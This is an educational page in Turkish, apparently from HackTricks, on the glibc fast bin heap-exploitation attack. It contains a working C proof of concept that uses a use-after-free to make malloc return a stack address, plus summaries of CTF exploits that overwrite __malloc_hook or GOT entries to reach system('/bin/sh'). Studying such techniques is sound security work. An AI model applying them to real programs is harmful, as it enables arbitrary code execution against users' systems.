# Fast Bin Attack

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

Fast bin nedir hakkında daha fazla bilgi için bu sayfayı kontrol edin:

{{#ref}}
bins-and-memory-allocations.md
{{#endref}}

Fast bin tek bağlı bir liste olduğu için, diğer binlere göre çok daha az koruma vardır ve sadece **serbest bırakılmış bir fast bin** parçasındaki bir adresi **değiştirmek**, **herhangi bir bellek adresinde daha sonra bir parça tahsis etmek** için yeterlidir.

Özetle:
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
Tam bir örneği [https://guyinatuxedo.github.io/28-fastbin_attack/explanation_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin_attack/explanation_fastbinAttack/index.html) adresindeki çok iyi açıklanmış bir kodda bulabilirsiniz:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
> [!CAUTION]
> Eğer global değişken **`global_max_fast`**'ın değerini büyük bir sayı ile geçersiz kılmak mümkünse, bu, daha büyük boyutlarda hızlı bin parçaları oluşturmayı sağlar ve potansiyel olarak daha önce mümkün olmayan senaryolarda hızlı bin saldırıları gerçekleştirmeye olanak tanır. Bu durum, [büyük bin saldırısı](large-bin-attack.md) ve [sıralanmamış bin saldırısı](unsorted-bin-attack.md) bağlamında faydalıdır.

## Örnekler

- **CTF** [**https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html)**:**
- Parçaları ayırmak, serbest bırakmak, içeriklerini okumak ve doldurmak (bir taşma açığı ile) mümkündür.
- **Bilgi sızıntısı için parçaları birleştirme**: Teknik, temelde taşmayı kötüye kullanarak sahte bir `prev_size` oluşturmak, böylece bir önceki parçanın daha büyük bir parçanın içine yerleştirilmesini sağlamaktır. Böylece, başka bir parçayı içeren daha büyük bir parça ayırırken, verilerini yazdırmak ve libc'ye bir adres sızdırmak mümkündür (`main_arena+88`).
- **malloc hook'unu geçersiz kılma**: Bunun için, önceki örtüşen durumu kötüye kullanarak, aynı belleğe işaret eden 2 parça elde etmek mümkündü. Bu nedenle, her ikisini de serbest bırakmak (korumaları aşmak için araya başka bir parçayı serbest bırakarak) hızlı bin içinde aynı parçanın 2 kez bulunmasını sağladı. Ardından, tekrar ayırmak, bir sonraki parçanın adresini `__malloc_hook`'tan biraz önce işaret edecek şekilde geçersiz kılmak (yani malloc'un serbest boyut olarak düşündüğü bir tamsayıya işaret etmesi - başka bir geçiş), tekrar ayırmak ve ardından malloc hook'larına bir adres alacak başka bir parça ayırmak mümkündü.\
Sonunda oraya bir **one gadget** yazıldı.
- **CTF** [**https://guyinatuxedo.github.io/28-fastbin_attack/csaw17_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin_attack/csaw17_auir/index.html)**:**
- Bir yığın taşması ve serbest bırakıldıktan sonra kullanma ve çift serbest bırakma vardır çünkü bir parça serbest bırakıldığında, işaretçileri yeniden kullanmak ve yeniden serbest bırakmak mümkündür.
- **Libc bilgi sızıntısı**: Bazı parçaları serbest bırakın ve bunlar ana arena konumunun bir kısmına işaret eden bir işaretçi alacaklardır. Serbest bırakılan işaretçileri yeniden kullanabildiğiniz için, bu adresi okuyun.
- **Hızlı bin saldırısı**: Tüm tahsisat işaretçileri bir dizi içinde saklanır, bu nedenle birkaç hızlı bin parçasını serbest bırakabiliriz ve sonuncusunda bu işaretçiler dizisine işaret eden adresi geçersiz kılabiliriz. Ardından, aynı boyutta birkaç parça ayırdığımızda önce geçerli olanı ve ardından işaretçi dizisini içeren sahte olanı alacağız. Artık bu tahsisat işaretçilerini geçersiz kılabiliriz, böylece `free`'nin GOT adresi `system`'e işaret eder ve ardından `"/bin/sh"`'yi parça 1'e yazarak `free(chunk1)` çağrısı yaparız, bu da `system("/bin/sh")`'yi çalıştırır.
- **CTF** [**https://guyinatuxedo.github.io/33-custom_misc_heap/csaw19_traveller/index.html**](https://guyinatuxedo.github.io/33-custom_misc_heap/csaw19_traveller/index.html)
- Sıralanmamış bin içinde parçaları birleştirmek için bir bayt taşmasını kötüye kullanarak libc bilgi sızıntısı elde etme ve ardından malloc hook'unu bir one gadget adresi ile geçersiz kılmak için hızlı bin saldırısı gerçekleştirme örneği.
- **CTF** [**https://guyinatuxedo.github.io/33-custom_misc_heap/csaw18_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom_misc_heap/csaw18_alienVSsamurai/index.html)
- Bir bilgi sızıntısından sonra, sıralanmamış bin ile bir UAF kullanarak bir libc adresi ve bir PIE adresi sızdırıldı, bu CTF'nin istismarı, kontrol edilen parçaların işaretçilerine sahip olduğu bir yerde bir parça ayırmak için hızlı bin saldırısını kullandı, böylece belirli işaretçileri geçersiz kılmak ve GOT'a bir one gadget yazmak mümkün oldu.
- Sıralanmamış bin saldırısı aracılığıyla kötüye kullanılan bir Hızlı Bin saldırısı bulabilirsiniz:
- Hızlı bin saldırıları gerçekleştirmeden önce libc/yığın adreslerini sızdırmak için serbest listeyi kötüye kullanmanın yaygın olduğunu unutmayın (gerekirse).
- [**Robot Factory. BlackHat MEA CTF 2022**](https://7rocky.github.io/en/ctf/other/blackhat-ctf/robot-factory/)
- Sadece `0x100`'den büyük boyutlarda parçalar ayırabiliriz.
- Bir Sıralanmamış Bin saldırısı kullanarak `global_max_fast`'ı geçersiz kılın (ASLR nedeniyle 1/16 kez çalışır, çünkü 12 bit değiştirmemiz gerekir, ancak 16 bit değiştirmemiz gerekir).
- Hızlı Bin saldırısı, bir global parça dizisini değiştirmek için. Bu, GOT'u değiştirme ve bazı işlevleri `system`'e işaret etme yeteneği veren keyfi bir okuma/yazma ilkesidir.

{{#ref}}
unsorted-bin-attack.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
